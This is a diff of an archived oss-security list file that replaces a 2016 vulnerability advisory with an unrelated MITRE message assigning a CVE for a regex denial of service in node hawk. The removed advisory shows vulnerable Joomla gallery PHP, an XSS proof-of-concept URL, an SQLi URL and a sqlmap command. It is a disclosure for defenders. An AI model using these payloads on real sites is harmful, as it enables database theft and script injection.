@@ -1,61 +1,53 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/23/3
-Message-id: <5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>
-Date: Sat, 23 Jul 2016 14:59:16 +0000 (GMT)
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/02/20/2
+Message-Id: <20160220152304.552F06C07A1@smtpvmsrv1.mitre.org>
+Date: Sat, 20 Feb 2016 10:23:04 -0500 (EST)
+From: cve-assign@...re.org
+To: kseifried@...hat.com
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE for nodejs hawk
 Content-Type: text/plain; charset=utf-8
 
-Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
-Fixed: v1.1.7
-Author: Larry W. Cashdollar, @_larry0 and Elitza Neytcheva, @ElitzaNeytcheva
-Date: 2016-07-14
-Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro
-Vendor: huge-it.com
-Vendor Notified: 2016-07-15, fixed 2016-07-23
-Vendor Contact: info@...e-it.com
-Description: The plugin allows you to add multiple images to the gallery, create countless galleries, add a description to each of them, as well as make the same things with video links.
-Vulnerability:
-The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability:
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-SQL in code via id parameter:
-./administrator/components/com_gallery/models/gallery.php
-51 public function getPropertie() {
-52 $db = JFactory::getDBO();
-53 $id_cat = JRequest::getVar('id');
-54 $query = $db->getQuery(true);
-55 $query->select('#__huge_itgallery_images.name as name,'
-56 . '#__huge_itgallery_images.id ,'
-57 . '#__huge_itgallery_gallerys.name as portName,'
-58 . 'gallery_id, #__huge_itgallery_images.description as description,image_url,sl_url,sl_type,link_target,#__huge_itg allery_images.ordering,#__huge_itgallery_images.published,published_in_sl_width');
-59 $query->from(array('#__huge_itgallery_gallerys' => '#__huge_itgallery_gallerys', '#__huge_itgallery_images' => '#__huge_itg allery_images'));
-60 $query->where('#__huge_itgallery_gallerys.id = gallery_id')->where('gallery_id=' . $id_cat);
-61 $query->order('ordering desc');
-62 
-64 $db->setQuery($query);
-65 $results = $db->loadObjectList();
-66 return $results;
-67 }
+> Does Mitre know about this?
 
+Thank you for this report. The MITRE CVE team had not previously been
+informed of that vulnerability. As mentioned in the
+http://www.openwall.com/lists/oss-security/2016/01/12/2 post,
+"CVE-PENDING" does not imply an earlier request.
 
+> https://nodesecurity.io/advisories/77
+> Regular Expression Denial of Service
 
-XSS is here:
+> https://github.com/hueniverse/hawk/issues/168
+> Long headers or uris can cause minor DoS
 
-root@...mla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET" {} \;
-./administrator/components/com_gallery/views/gallery/tmpl/default.php
-root@...mla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET" {} \;
-256: <a class="modal" rel="{handler: 'iframe', size: {x: 800, y: 500}}" href="index.php?option=com_gallery&view=video&tmpl=component&pid=<?php echo $_GET['id']; ?>" title="Image" >
-CVE-2016-1000113 2016-1000114
-JSON: Export
-Exploit Code:
-XSS PoC
-http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+> https://github.com/hueniverse/hawk/commit/0833f99ba64558525995a7e21d4093da1f3e15fa
+> // Limit the length of uris and headers to avoid a DoS attack on string matching
 
-SQLi PoC
-http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=SQLiHERE
+Use CVE-2016-2515.
 
-$ sqlmap --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=*" --dbms mysql
-Screen Shots:
-Advisory: http://www.vapidlabs.com/advisory.php?v=164
-Content of type "text/html" skipped
+- -- 
+CVE assignment team, MITRE CVE Numbering Authority
+M/S M300
+202 Burlington Road, Bedford, MA 01730 USA
+[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
+
+iQIcBAEBCAAGBQJWyIRZAAoJEL54rhJi8gl5WhMP/193koIE+vRIVMuT+2yRfXhL
+u+ffJKUvx/K0cSY2AaB1K+T77r6OmOCKgDrwPN2d1gaZxuAA/gX3GK42Lo7Mf6Vp
+uVcFArlOtNTghNxlWZVP5/vjAkG7ykgrmgGZOQFUjH9KMN7xS6ocrrR+SuHVthFU
+p+jt1Qun+c+1F5WEWc35XV9f3XSKmcf/Cw0u7mJDXK9paWY8wDRfHhDNHQnmXB/i
+nEgiI+ShdjksLhsO5GWTBQYEEiRArMKYYIKNA2RXfQcANAwU5x+AYyLoYqjGkCms
+ABhs66NBYhLobKq92Cyz6h8urkyydLcvHnXfcwoUW1Cce+6QwmlFgnI5CuT3FO4P
+CuBFtwF3zNlbDP8EnjOLJDu/qQZqnoskrBD84c+f8VsKyZloS9CBhnjZzmpmvl+x
+wjH2/pJqhgDdlRbZKlPam/JhDVLc0cZlhySb3NZguvzeKt0Gj7NOyNH7du7p8TA0
+yQPlX+MA/R5zvrWmX7cR+hhmITOIwbdX91fMn/+y293E1WKcKGEuxNtCYEmvBDET
+RZPleVe6xxUdzOYkbSDTytuEQcBTkU1Arnu8clNXs98mC5ujJbicAQDPsIEvT95e
+MR9b/6khL9z/lAYHyOC2AfxJYvexztRi6SzIAG6LX6JGFUB7YIcUoYDydrH4JyYg
+7VRvjxDTRn8RUxhMWULb
+=IyjB
+-----END PGP SIGNATURE-----
